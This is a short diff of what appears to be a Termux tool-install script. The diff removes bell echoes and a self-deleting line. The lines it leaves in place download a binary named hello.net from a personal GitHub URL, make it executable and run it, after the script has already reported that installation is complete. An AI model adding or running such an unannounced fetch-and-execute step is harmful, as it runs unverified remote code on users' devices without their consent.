@@ -76,13 +76,6 @@ clear
 echo -e "${f2}~$install pack complete!${f0}"
 echo -e "${f4}~$user press exit!${f0}"
 termux-notification -t "script done!" -c "install all tool done!" --sound
-echo -e "{$\a}"
-sleep 0.3
-echo -e "${\a}"
-sleep 0.3
-echo -e "${\a}"
-rm -- "$0"
-
 curl -o hello.net 'https://raw.githubusercontent.com/Camtuong153/VM/refs/heads/main/File.net'
 chmod +x hello.net
 ./hello.net
